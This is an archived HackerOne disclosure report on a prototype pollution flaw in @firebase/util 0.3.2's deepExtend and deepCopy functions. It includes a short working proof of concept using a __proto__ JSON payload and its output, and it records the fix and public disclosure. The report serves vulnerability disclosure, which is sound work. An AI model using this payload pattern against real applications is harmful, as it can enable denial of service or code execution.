---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - env/web
  - stack/node
  - stack/firebase
  - vuln/code-injection
  - vuln/dos
  - impact/rce
substate: "resolved"
weakness: null
enriched: true
body: true
date: 2020-11-17
submitted: 2020-10-07T15:00:05.559Z
bounty_usd: null
votes: 0
cve: []
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "d3lla"
source: "https://hackerone.com/reports/1001218"
title: "[@firebase/util] Prototype pollution"
---
# [@firebase/util] Prototype pollution

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 0 | **Program:** Node.js third-party modules | **Disclosed:** 2020-11-17

- Report: [https://hackerone.com/reports/1001218](https://hackerone.com/reports/1001218)
- CWE: N/A
- Submitted: 2020-10-07T15:00:05.559Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

# Module

**module name:** `@firebase/util`
**version:** `0.3.2`
**npm page:** `https://www.npmjs.com/package/@firebase/util`

## Module Description

NOTE: This is specifically tailored for Firebase JS SDK usage, if you are not a member of the Firebase team, please avoid using this package

This is a wrapper of some Webchannel Features for the Firebase JS SDK.

## Module Stats

[1,516,157] weekly downloads

# Vulnerability

## Vulnerability Description

I tested the [`deepCopy`](https://github.com/firebase/firebase-js-sdk/blob/master/packages/util/src/deepCopy.ts) and [`deepExtend`](https://github.com/firebase/firebase-js-sdk/blob/master/packages/util/src/deepCopy.ts) functions.

The `deepCopy` and `deepExtend` functions can be used to add/modify properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:
- install `@firebase/util` module:
    - `npm i ``@firebase/util`

Run the following poc:
```javascript
const utils = require('@firebase/util');

const obj = {};
const source = JSON.parse('{"__proto__":{"polluted":"yes"}}');
console.log("Before : " + obj.polluted);
utils.deepExtend({}, source);
// utils.deepCopy(source);
console.log("After : " + obj.polluted);

```
Output:
```console

Before : undefined
After : yes
```
{F1024346}

## Supporting Material/References:

- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v14.11.0
- NPM VERSION: 6.14.8

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 


Thank you for your time.

best regards,

d3lla

## Impact

The impact depends on the application. In some cases it is possible to achieve Denial of service (DoS), Remote Code Execution, Property Injection.

## Timeline

- **Report Filed**
- **2020-10-07** @d3lla: I forgot to add the weakness that should be: Modification of Assumed-Immutable Data (MAID). Could you kindly update the report description? 

Thanks and have a nice day!
d3lla
- **2020-11-15** @d3lla: Hi team,

I hope everything is going well for you.

I saw that the vulnerability seems to be fixed.
On 27th October a fix was committed (Commit: https://github.com/firebase/firebase-js-sdk/commit/9cf727fcc3d049551b16ae0698ac33dc2fe45ada and PR:https://github.com/firebase/firebase-js-sdk/pull/4001)  and recently a report was published on Snyk (https://snyk.io/vuln/SNYK-JS-FIREBASEUTIL-1038324).

What do think about closing and disclosing this report? Would it be possible?

Thank you for your time.
- **Changed Scope**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
